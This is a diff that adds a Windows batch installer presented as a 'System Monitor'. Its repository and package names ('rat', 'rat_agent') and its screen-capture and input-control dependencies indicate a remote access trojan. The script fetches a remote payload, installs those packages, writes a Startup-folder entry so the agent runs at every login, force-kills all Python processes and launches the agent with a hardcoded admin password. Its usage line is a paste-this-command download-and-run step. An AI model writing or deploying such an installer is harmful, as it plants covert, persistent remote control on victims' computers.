@@ -1,0 +1,158 @@
+@echo off
+REM ================================================================================
+REM System Monitor - Bootstrap Installer for Windows
+REM 
+REM Usage: powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/YOUR_USER/rat/main/install_windows -OutFile install.bat" && install.bat
+REM
+REM This script downloads and installs the System Monitor automatically
+REM ================================================================================
+
+echo.
+echo ================================================================
+echo              System Monitor - Bootstrap Installer
+echo ================================================================
+echo.
+
+REM Configuration - UPDATE THESE URLs
+set GITHUB_USER=dukeetheprogrammer
+set GITHUB_REPO=rat
+set GITHUB_BRANCH=main
+set BASE_URL=https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/%GITHUB_BRANCH%
+set AGENT_URL=%BASE_URL%/agent_windows.zip
+
+REM Detect Python
+echo [INFO] Detecting Python...
+python --version >nul 2>&1
+if %errorlevel% equ 0 (
+    set PYTHON_CMD=python
+    echo [OK] Python found
+    python --version
+) else (
+    echo [FAIL] Python not found!
+    echo Please install Python from https://python.org
+    echo Check "Add Python to PATH" during installation
+    pause
+    exit /b 1
+)
+
+REM Check for curl/wget
+set DOWNLOADER=
+where curl >nul 2>&1
+if %errorlevel% equ 0 set DOWNLOADER=curl
+where wget >nul 2>&1
+if %errorlevel% equ 0 set DOWNLOADER=wget
+
+if not defined DOWNLOADER (
+    echo [INFO] Using PowerShell for download...
+    set DOWNLOADER=powershell
+)
+
+REM Download agent
+echo.
+echo [INFO] Downloading System Monitor agent...
+
+set INSTALL_DIR=%USERPROFILE%\sysmon
+set AGENT_DIR=%INSTALL_DIR%\agent
+
+mkdir "%INSTALL_DIR%" 2>nul
+
+if "%DOWNLOADER%"=="curl" (
+    curl -sL "%AGENT_URL%" -o "%INSTALL_DIR%\agent.zip"
+) else if "%DOWNLOADER%"=="wget" (
+    wget -q "%AGENT_URL%" -O "%INSTALL_DIR%\agent.zip"
+) else if "%DOWNLOADER%"=="powershell" (
+    powershell -Command "& {Invoke-WebRequest -Uri '%AGENT_URL%' -OutFile '%INSTALL_DIR%\agent.zip'}"
+) else (
+    echo [FAIL] No downloader found!
+    pause
+    exit /b 1
+)
+
+REM Extract
+echo [INFO] Extracting agent...
+powershell -Command "& {Expand-Archive -Path '%INSTALL_DIR%\agent.zip' -DestinationPath '%INSTALL_DIR%' -Force}"
+del "%INSTALL_DIR%\agent.zip"
+
+echo [OK] Agent downloaded and extracted
+
+REM Install Python packages
+echo.
+echo [INFO] Installing Python dependencies...
+
+%PYTHON_CMD% -m pip install --quiet --upgrade pip
+%PYTHON_CMD% -m pip install --quiet flask flask-socketio requests mss pillow python-socketio python-engineio pyautogui
+
+if %errorlevel% neq 0 (
+    echo [WARN] Some packages may have failed
+)
+
+echo [OK] Python dependencies installed
+
+REM Initialize database
+echo.
+echo [INFO] Initializing database...
+
+cd "%AGENT_DIR%"
+%PYTHON_CMD% -c "import sys; sys.path.insert(0, '.'); from rat_agent.database import init_db; init_db()" 2>nul
+
+echo [OK] Database ready
+
+REM Setup auto-start
+echo.
+echo [INFO] Configuring auto-start on Windows login...
+
+set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+
+if not exist "%STARTUP_DIR%" mkdir "%STARTUP_DIR%"
+
+REM Create startup script
+(
+    echo @echo off
+    echo cd /d "%AGENT_DIR%"
+    echo start /B python rat_agent\agent.py
+    echo timeout /t 5 /nobreak >nul
+    echo start /B python dashboard\app.py
+) > "%STARTUP_DIR%\System Monitor.bat"
+
+echo [OK] Auto-start configured
+
+REM Start services
+echo.
+echo [INFO] Starting System Monitor...
+
+REM Kill existing
+taskkill /F /IM python.exe 2>nul
+
+REM Start agent
+start /B python "%AGENT_DIR%\rat_agent\agent.py"
+echo [OK] Agent started
+
+REM Wait
+timeout /t 5 /nobreak >nul
+
+REM Start dashboard
+start /B python "%AGENT_DIR%\dashboard\app.py"
+echo [OK] Dashboard started
+
+echo.
+echo ================================================================
+echo                    Installation Complete
+echo ================================================================
+echo.
+echo  Local URL:   http://localhost:5000
+echo  Login:       admin / rat_admin_2024
+echo.
+echo  The agent will auto-start on Windows login
+echo.
+echo  Logs:
+echo    Agent:     %TEMP%\sysmon_agent.log
+echo    Dashboard: %TEMP%\sysmon_dashboard.log
+echo.
+echo  Stop:   taskkill /F /IM python.exe
+echo  Status: tasklist | findstr python
+echo.
+echo  Agent location: %AGENT_DIR%
+echo.
+echo ================================================================
+echo.
+pause
